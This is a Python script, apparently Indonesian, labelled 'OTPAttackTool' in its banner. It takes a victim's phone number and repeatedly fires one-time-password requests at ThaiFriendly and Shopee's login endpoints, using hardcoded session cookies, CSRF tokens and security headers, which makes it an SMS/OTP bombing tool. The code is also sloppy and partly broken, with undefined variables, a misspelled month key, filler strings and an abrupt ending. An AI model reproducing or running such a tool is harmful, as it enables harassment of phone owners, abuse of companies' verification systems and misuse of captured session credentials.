import sys
import subprocess

try:
    import requests
    import time
    import random
    import os
    import urllib3
    import json
    import bs4
    
except ImportError as e:
    print(f"error importing module:{e}")
    sys.exit(1)

finally:
    import requests
    import urllib3
    from bs4 import BeautifulSoup as bs

def banner():
    ascii_art = """ 
  ____  _________  ___  __  __           __  ______          __
 / __ \/_  __/ _ \/ _ |/ /_/ /____ _____/ /_/_  __/__  ___  / /
/ /_/ / / / / ___/ __ / __/ __/ _ `/ __/  '_// / / _ \/ _ \/ / 
\____/ /_/ /_/  /_/ |_\__/\__/\_,_/\__/_/\_\/_/  \___/\___/_/  
  
    """
    print(ascii_art)
    
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from requests import post,get

green   = "\033[1;92m"
white   = "\033[1;97m"
gray    = "\033[1;90m"
yellow  = "\033[1;93m"
purple  = "\033[1;95m"
red     = "\033[1;91m"
blue    = "\033[1;96m"

def typing(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)
        
def countdown(time_sec):
        mins, secs = divmod(time_sec,60)
        timeformat = '\033[1;97m[\033[1;93m \033[1;97m] Please Wait For The Process \033 [1;92m{:02d}:{:02d}'.format(mins,secs)
        waktu = time.localtime()
        keterangan_jam     = time.strftime("%H:%M:%S", waktu)
        keterangan_tanggal = time.strftime("%d", waktu)
        keterangan_bulan   = time.strftime("%B", waktu)
        bulan_bulan        = {
            "January"      : 'Januari',
            "February"     : "Februari",
            "March"        : "Maret",
            "April"        : "April",
            "May"          : "Mei",
            "June"         : "Juni",
            "July"         : "Juli",
            "August"       : "Agustus",
            "September"    : "September",
            "October"      : "Oktober",
            "Novemebr"     : "November",
            "December"     : "Desember"
            }
        bulan     = bulan_bulan.get(keterangan_bulan)
        tahun     = time.strftime("%Y", waktu)
        hari      = time.strftime("%A", waktu)
        hari_hari = {
            "Sunday"       : 'Minggu',
            "Monday"       : "Senin",
            "Tuesday"      : "Selasa",
            "Wednesday"    : "Rabu",
            "Thursday"     : "Kamis",
            "Friday"       : "Jumat",
            "Saturday"     : "Sabtu"
        }
        hari = hari_hari.get(keterangan_hari)
        print(f"{timeformat} | {blue} {hari}, {keterangan_tanggal} {keterangan_jam}", end='\r')
        time.sleep(1)
        time_sec -= 1
        
def tanya(nomor):
    check_imput = 0
    while check_imput == 0:
        a = input (f"""{red}Eant To Redo The Tools? Y/N {white} Your Input: {green}""")
        if a == "y" or a == "Y":
            check_imput = 1
            start(nomor, 1)
            break
        elif a == "n" or a == "N":
            check_imput = 1
            typing(f"{green}Exit The Tools")
            sys.exit()
            break
        else:
            print ("Enter the Command Correctly!!")
            sys.exit

def jam(nomor):
    typing("program Runing")
    b = nomor[1:12]
    c = "62" + b
    rto = 0
    RTO_flag = 0
    for _ in range(10):
        try:
            Thai_friendly    =  requests.post("https://www.thaifriendly.com/nt/app.php",headers={'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':b,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
            Shopee           =  requests.post("https://shopee.co.id/api/v4/otp/send_vcode", data=({"phone":c,"force_channel":true,"m_token":"","captcha_signature":"f349b8da10df0968417bcd8ae861cbdf9646f310f56e5b9768de9d4256e2e7f64151ca55b370efcf26fcbc6186b5cb084d106362e49a2a8aaf41b91ab3d356b5bcd54ef1e3fb3577d2cf40fe0358d6ca5887497a4647fc9e5f183c283193767058a6b781f26ac6e78cbc0766f4201d67bdf2134affc498896e796bb52413721b429bd7ce55e23cd19d9fd7d59184cf2c31abdf530dc89673978f060befc344d5d29298e4563389aa4883e7ec222422575cf4ade0dc36e3e356721a4fa769f7defe6040c7d4eb29c81889e8cc38c92f70f1204e1e81908c16c34e5af303e3c5ac7f5950e0bd27cb5380e804d017f2ddbd66959a4541220ebd9c422fa89da31db36ad25df7ecf96c8f92c809386dfb962478abb9bd29431cc33d84402dd2012532b86fa6d39a606ffdb3f5048813e8e76e5110e28f76bfc506255a5d867aa13637e6d674b2905a2c41368f500b58aed32c4318de71bbfed61c3f28662651c71ba09a877513cbc17e9242e57ae6e733f20a769dab1d2c69fef9fd28fbdc08eff36bdc9f95b08eeb9229edd01cefe57d088f37ecba15595f53f532c0a83b28030e91f30c7f09b33e5374f1f96604bd5253d384bdf0915289a28d181c403f03146e3cec806ee3d58cddfdb12ade88aca0ae0ac23e676e01ad0299b84dc668104dfc5835482e6b1477e69a7b","operation":14,"channel":3,"supported_channels":[1,2,3,6,0,5],"support_session":"true"}), headers={"Host": "shopee.co.id", "cookie": "_gcl_au=1.1.1335692303.1723146463", "cookie": "_QPWSDCXHZQA=22eb82b0-bbef-4af5-8fa7-a32aa82861f1", "cookie": "REC7iLP4Q=a7bf8b1c-2c16-491e-9734-8da0e92ac381", "cookie": "SPC_R_T_IV=YzNXb3pNWnBoendOVDFKYw==", "cookie": "SPC_T_ID=fQFcrTnFuKwefaCfJvEb/voAmAYIxT+ho26MZ4lyjWlDx35LkTvxqTCRhuEyqjLRdlxvtJNAxkml4PwC5nlthehvdTftJcZfaCusY9EIzyD4fY7xDUEvTsIQ1d4Xg5/cTTbpq9FIBwppMZ5bumdVXw/TdBcPVrYKsGa7mLHGrK0=", "cookie": "SPC_T_IV=YzNXb3pNWnBoendOVDFKYw==", "cookie": "SPC_SI=tGWfZgAAAABMQ09TYUYxcJjLaAIAAAAAbWtER0tNUmY=", "cookie": "SPC_SEC_SI=v1-eFdwbGlvQk9XbVU2U2RSRuLTX2nh9oS19jScd+QbY5t30PSl8zeouiXRZ9T9mhWVvLN53J0ASx/JYxzuR89Z53cQPVqApNpRHFKIxMGbH9M=", "cookie": "SPC_F=9A4KaQ4S2Rmmfr8AnGDpk7gDLZFaRr9O", "cookie": "REC_T_ID=145ff317-55bf-11ef-b47e-d24904d76d37", "cookie": "SPC_R_T_ID=fQFcrTnFuKwefaCfJvEb/voAmAYIxT+ho26MZ4lyjWlDx35LkTvxqTCRhuEyqjLRdlxvtJNAxkml4PwC5nlthehvdTftJcZfaCusY9EIzyD4fY7xDUEvTsIQ1d4Xg5/cTTbpq9FIBwppMZ5bumdVXw/TdBcPVrYKsGa7mLHGrK0=", "cookie": "_fbp=fb.2.1723146465059.55087184451892152", "cookie": "__LOCALE__null=ID", "cookie":"csrftoken=DgPiGgYOiTI3kxB0Dce6RNgrxrsH4fIS", "cookie": "shopee_webUnique_ccd=L98m8X5IwkSQNXtZMTas1Q%3D%3D%7CYbvT6UTyg8iQJ8Nf8XipvoiA%2BqScg%2Blmi3TvD%2FGl8u%2BfN13wWInRqrfgsPBHVPM7s%2B90D2Iv31BW5DU%3D%7C9QhAaiTogBs50RyP%7C08%7C3", "cookie": "ds=de0ad0abc6dc799ea2c6f45354dbc6f0", "cookie": "_sapid=13b674d6f396c1b016ebb8d4c38ff8a434433e659449294dcf139ccf", "cookie": "AMP_TOKEN=%24NOT_FOUND", "cookie": "_ga=GA1.3.1292621396.1723184246", "cookie": "_gid=GA1.3.1005203515.1723184247", "cookie": "_ga_SW6D8G0HXK=GS1.1.1723184245.1.1.1723184330.60.0.0", "content-length": "1145", "sec-ch-ua":'"Chromium";v="123", "Not:A-Brand";v="8"', "X-Sap-Sec": "LyioF7xRJAd5abARbmzRbxHRbmj5bmpRZmzNbY5RPJlXbYzRIJlbbwAR5mlpbCRRoJlPbCXRpmlKbG5RemlNbGbRHFmtba5RMmmXbazRQJmGbbRRdmmzbxpRLmmObxzR/mm/bZRR7mmcbZzRWmyVbiuR9myAbj5RFmyfbjzRnmyEbf6RtFyrbfzRvmy6bguRVmzubyRRiJz8byARjJzwbz2RmmzfbzzRCmzHblARKczRbi5QbmyXbczRbmzRO/Rcbmz28S7HCmwRbY5cbmyRbJzRbmzRACDwbYECI0JvbmzRCXI+HbGR90kP+mbRbbRcbmzRbmysqmwRbzAQbmz7sj0t7TxOLclmAcjV4SxP4yRLfJzRbZNXbczRmmwRbl5QbmyKgFzTrmbRbwSZ5MaXXpS0WmzRbwWabyMyXhk7HmbRbmzRbZyAbmzRbmzRtpAdbmywbczR4mjRbmzRHk4NaZ4lbmmRfkzcbmyEaD7IbGQi8DxSfTI94QyF1/XR0kAcbmzRRmNdQ7Spx/Uk8iTRbczR9mbRbY+76a6Rbmz7djFGYDzcbmzRbmysC8zXTcARbmz5o1KqXmjRbfX05ktMNJofoR1C/iq1XTaE47nCugHcRl8Cs97OkvCp1RYzf0AwtO2b5paw4LfLZprpW8OY7g8SVrd+0QW7/HJD9MSDhp2hc+F5h4zBk9XM4WpddDW55CK2S2tZjN8U8E/uMmO4RmEdk1wKZuxIZ+IMC7AdhxCbP/g5O7uvCILotMRkSfP4wAa+lQwp0jdgiRKaTl8kmg1EKoSPGc+6hZM4qUQDjmJRTfZZwKA2kaJylrVCDlll/qdb0nKJk6FkUuAMIw1Xu2D92tQx1TmLPaBld45btHC0Mp0AYUCXOLByF8yEtjf+rDd1qpoSTGSIYSNvc7whCMWGoYSr8TtBx/zuDo4Dkgjax2lzMwN4u3H3UFz2YpenzTvLCuqbbUjv6dDYJwBaYZjE/Sr8DzbQ3BYHsQXrb6Gz7x3p8Njvn3ZB0pnlWGb9Dq5dREf/bym3IfafeqpwYQRyl2GPINf3R00387qWaqOmkDnDbLDz2f3namzRbYMw29HNbmzR3HP4WcRRbmygiTz9TyXFAFzRbmz6bmzR7qQIL185GiHVbmzRiGdULQGiWgdlezge1HyUvdD0WtSMc943TLRzeMZa8868E5JsYoAGU4IKlxXPcz5eT/raKIOF8IRRbmzRbmzRbmzRbmzKbmzRiG2x6Q8zmWzWeRccYVbbbmARbmya2NE7bmzRbmARbml+2vMLamzRbgY+LebNbmzRgMgE6cRRbmy5PQdkYY3wqcRRbmzTTjAVgXV8AFzRbmz6bmzRaq2HQzF4GiHNbmzRfBPycFbRbmzUnFzRbczRbykobmzNbmzRfBPycFRRbmyygXXTgXXXTFzRbmz6bmzRJIs7B6IzAlVNbmzRfc3AFmwRbmlcVSXRZmzRbyVViTyji4w9bmzRbC==", "Sec-Ch-Ua-Mobile": "?0", "X-Sz-Sdk-Version": "1.10.9", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36", "X-Api-Source": "pc", "X-Sap-Ri": "feb4b566df64016487f55c3204017e2b002565ec017927c8774e", "Accept": "application/json", "Content-Type": "application/json", "X-Shopee-Language": "id", "X-Requested-With": "XMLHttpRequest", "Af-Ac-Enc-Dat": "a04b46c8f6fe8504", "X-Csrftoken": "DgPiGgYOiTI3kxB0Dce6RNgrxrsH4fIS", "Af-Ac-Enc-Sz-Token": "L98m8X5IwkSQNXtZMTas1Q==|YbvT6UTyg8iQJ8Nf8XipvoiA+qScg+lmi3TvD/Gl8u+fN13wWInRqrfgsPBHVPM7s+90D2Iv31BW5DU=|9QhAaiTogBs50RyP|08|3", "Sec-Ch-Ua-Platform": "Linux", "Origin": "https://shopee.co.id", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://shopee.co.id/buyer/login/otp", "Accept-Encodin": "gzip, deflate, br","Accept-Languag": "en-US,en;q=0.9", "Priority": "u=1, i"})
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            typing(f"Successful OTP Sending")
            countdown(120)
        except requests.exceptions.ConnectionError:
            if RTO_flag == 0:
                print("")
                typing("dfsdfs")
                print(f"daksjd")